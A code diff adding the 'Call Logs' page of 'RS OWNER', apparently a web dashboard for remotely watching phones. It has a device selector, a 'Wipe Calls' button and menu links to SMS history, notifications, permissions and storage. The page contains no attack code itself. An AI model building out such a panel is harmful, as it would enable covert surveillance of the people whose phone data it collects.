@@ -1,0 +1,65 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Call Logs - RS OWNER</title>
+    <link rel="stylesheet" href="/static/css/style.css">
+    <script src="https://unpkg.com/lucide@latest"></script>
+    <style>
+        .data-list-container {
+            max-height: 75vh;
+            overflow-y: auto;
+            padding-right: 10px;
+        }
+    </style>
+</head>
+<body>
+    <div class="app-container">
+        <!-- Sidebar -->
+        <div class="sidebar glass-panel">
+            <div class="sidebar-brand">
+                <i data-lucide="shield" style="color: var(--accent-cyan);"></i>
+                <span>RS OWNER</span>
+            </div>
+            <ul class="sidebar-menu">
+                <li><a href="/dashboard"><i data-lucide="layout-dashboard"></i> Overview</a></li>
+                <li><a href="/permissions"><i data-lucide="shield-check"></i> Permissions</a></li>
+                <li><a href="/notifications"><i data-lucide="bell"></i> Notifications</a></li>
+                <li class="active"><a href="/calls"><i data-lucide="phone"></i> Call Logs</a></li>
+                <li><a href="/messages"><i data-lucide="message-square"></i> SMS History</a></li>
+                <li><a href="/files"><i data-lucide="folder-open"></i> Storage</a></li>
+                <li><a href="/logs"><i data-lucide="terminal"></i> System Logs</a></li>
+            </ul>
+        </div>
+
+        <!-- Main Content -->
+        <main class="main-content">
+            <header class="topbar">
+                <h2 style="font-weight: 700;">Secure Telephony Monitoring</h2>
+                <div class="device-switcher" style="display: flex; align-items: center; gap: 15px;">
+                    <select id="device-select"></select>
+                    <!-- Storage Cleanup Button for Calls -->
+                    <button onclick="wipeCallsHistory()" style="background: #ff3b30; color: white; border: none; border-radius: 5px; padding: 8px 15px; cursor: pointer; font-weight: bold; display: flex; align-items: center; gap: 5px; transition: 0.3s;">
+                        <i data-lucide="trash-2" style="width: 16px; height: 16px;"></i> Wipe Calls
+                    </button>
+                </div>
+            </header>
+
+            <div class="glass-panel" style="padding: 25px;">
+                <div class="data-list-container" id="calls-list">
+                    <!-- JS Engine will inject Call Data here -->
+                    <div style="color: #888; text-align: center; padding: 20px;">Fetching encrypted telephony data...</div>
+                </div>
+            </div>
+        </main>
+    </div>
+    
+    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+    <script src="/static/js/auth.js"></script>
+    <script src="/static/js/app.js"></script>
+    <!-- Iska JS engine hum next banayenge -->
+    <script src="/static/js/calls_engine.js"></script>
+    <script>lucide.createIcons();</script>
+</body>
+</html>
